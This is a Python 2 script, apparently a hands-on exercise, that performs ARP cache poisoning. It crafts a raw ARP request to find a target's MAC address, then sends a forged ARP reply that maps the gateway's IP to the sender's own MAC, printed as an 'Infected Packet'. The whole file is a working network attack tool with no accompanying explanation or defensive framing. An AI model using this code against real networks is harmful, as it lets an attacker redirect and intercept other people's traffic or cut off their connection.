import socket
from uuid import getnode as get_mac
import subprocess
import sys

def mymac() :
	mac = "%012x" %get_mac()
	return_val = ''
	for i in range(0, len(mac) / 2) :
		return_val = return_val + chr(int('0x' + mac[i*2:i*2+2] ,16))
	return return_val

def myip() :
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("google.com",80))
	ip = s.getsockname()[0].split('.')
	return_val = ''
	for i in ip :
		return_val = return_val + chr(int(i))
	s.close()
	return return_val

def find_target_MAC(target_ip) :
	s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
	sr = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
	s.bind(('ens33', socket.SOCK_RAW))
	pkt = '\xff\xff\xff\xff\xff\xff'
	pkt = pkt + mymac()
	pkt = pkt + '\x08\x06'
	pkt = pkt + '\x00\x01'
	pkt = pkt + '\x08\x00'
	pkt = pkt + '\x06\x04\x00\x01'
	pkt = pkt + mymac()
	pkt = pkt + myip()
	pkt = pkt + '\x00\x00\x00\x00\x00\x00'
	for i in target_ip.split('.') :
		pkt = pkt + chr(int(i))
	pkt = pkt + '\x00' *20
	print "[+] Send ARP Request Packet"
	s.send(pkt)
	data = sr.recvfrom(80)[0]
	print "[+] Recive ARP Reply Packet"
	pos = 1
	target_MAC = ''
	if data[12] == '\x08' and data[13] == '\x06' and data[20] == '\x00' and data[21] == '\x02' :
		for i in range(6, 12) :
			target_MAC = target_MAC + data[i]
	
		global find
		find = 0
	else :
		print "[!] Fail, Retry"
	s.close()
	sr.close()
	return target_MAC

def get_gateway() :
	p = subprocess.Popen('route', shell=True, stdout=subprocess.PIPE)
	data = p.communicate()
	sdata = data[0].split()
	gwIp = sdata[sdata.index('default') + 1]
	print "[+] Gateway IP : " + gwIp
	return gwIp

def send_reply_pkt(target_IP, target_MAC) :
	s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
	s.bind(('ens33', socket.SOCK_RAW))
	pkt = target_MAC
	pkt = pkt + mymac()
	pkt = pkt + '\x08\x06' 
	pkt = pkt + '\x00\x01'
	pkt = pkt + '\x08\x00'
	pkt = pkt + '\x06\x04\x00\x02'
	pkt = pkt + mymac()
	for i in get_gateway().split('.') :
		pkt = pkt + chr(int(i))
	pkt = pkt + target_MAC
	for i in target_IP.split('.') :
		pkt = pkt + chr(int(i))
	s.send(pkt)
	print "[+] Send Infected Packet"

if len(sys.argv) != 2 :
	print "Usage : arp.py [target_ip]"
	exit()

global find
find = 1

while find :
	target_MAC = find_target_MAC(sys.argv[1])

print "[+] FIND TARGET MAC ADDRESS : " + "%02x:%02x:%02x:%02x:%02x:%02x" %(ord(target_MAC[0]), ord(target_MAC[1]), ord(target_MAC[2]), ord(target_MAC[3]), ord(target_MAC[4]), ord(target_MAC[5]))

send_reply_pkt(sys.argv[1], target_MAC)
